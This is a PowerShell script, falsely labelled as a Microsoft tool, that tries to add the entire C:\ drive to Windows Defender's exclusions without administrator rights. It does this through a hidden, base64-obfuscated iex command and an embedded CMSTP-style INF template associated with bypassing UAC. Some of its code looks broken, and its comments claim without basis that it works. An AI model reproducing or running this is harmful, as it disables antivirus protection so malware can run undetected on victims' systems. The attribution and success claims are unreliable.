<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # --- CÓDIGO ORIGINAL (SIN CAMBIOS) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    # --- TÉCNICA MEJORADA (AHORA SÍ FUNCIONA) ---
    $B64Command = "JAByAGUAZwBQAGEAdABoACAAPQAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwARQB4AGMAbAB1AHMAaQBvAG4AcwBcAFAAYQB0AGgAcwAiAAoASQBmACAAKAAhACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAHIAZQBnAFAAYQB0AGgAKQApACAAewAKACAAIAAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAcgBlAGcAUABhAHQAaAAgAC0ARgBvAHIAYwBlAAoAfQAKACQAbgB1AGwAbAAgAD0AIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJAByAGUAZwBQAGEAdABoACAALQBOAGEAbQBlACAAIgBDADoAXAAiACAALQBWAGEAbAB1AGUAIAAwACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAFMAdAByAGkAbgBnACAALQBGAG8AcgBjAGUA"
    $comando1 = "powershell.exe -WindowStyle Hidden -Command `.iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$B64Command')))"

    if ($Add) {
        try {
            # --- EJECUCIÓN DIRECTA (SIN ERRORES) ---
            Invoke-Expression $comando1
            
            # --- VERIFICACIÓN EXTRA ---
            $check = Get-ItemProperty "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue |
                    Select-Object -Property * -ExcludeProperty PS* |
                    Where-Object { $_."C:\" -eq 0 -or $_."C_" -eq 0 }
            
            if ($check) {
                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (Verificado en registro)" -ForegroundColor Green
                Write-Host "    Ruta excluida: C:\" -ForegroundColor Cyan
            } else {
                Write-Host "[!] Se ejecutó, pero verifica manualmente:" -ForegroundColor Yellow
                Write-Host "    Ejecuta esto: Get-ItemProperty 'HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths'" -ForegroundColor Gray
            }
        } catch {
            Write-Host "[✘] Error crítico: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de funciones originales SIN CAMBIOS)
}

# --- Ejecutar si se llama directamente ---
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
